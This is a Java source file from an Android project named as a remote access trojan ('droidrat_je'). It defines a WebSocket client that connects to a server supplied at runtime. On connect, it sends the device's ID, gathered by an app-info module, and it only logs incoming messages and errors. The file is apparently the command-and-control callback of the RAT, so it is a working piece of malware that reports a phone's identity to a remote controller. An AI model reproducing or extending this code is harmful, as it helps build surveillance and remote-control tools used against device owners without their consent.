package com.je_chen.droidrat_je.socket.websocket;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;


import com.je_chen.droidrat_je.modules.appsinfo.getinfo.GetPackagesInfo;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;

public class Websocket extends WebSocketClient {

    private static Websocket instance;
    private GetPackagesInfo getPackagesInfo;

    public Websocket(URI serverUri, PackageManager packageManager, Context context) {
        super(serverUri);
        instance = this;
        getPackagesInfo = new GetPackagesInfo(packageManager, context);
    }

    public static Websocket instance() {
        return instance;
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        Log.e("WebSocket", "onOpen");
        this.send("deviceID " + getPackagesInfo.getDeviceId());
    }

    @Override
    public void onMessage(String message) {
        Log.e("WebSocket", "onMessage");
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        Log.e("WebSocket", "onClose " + reason);
        instance = null;
    }

    @Override
    public void onError(Exception ex) {
        Log.e("WebSocket", "onError " + ex.getMessage());
    }
}
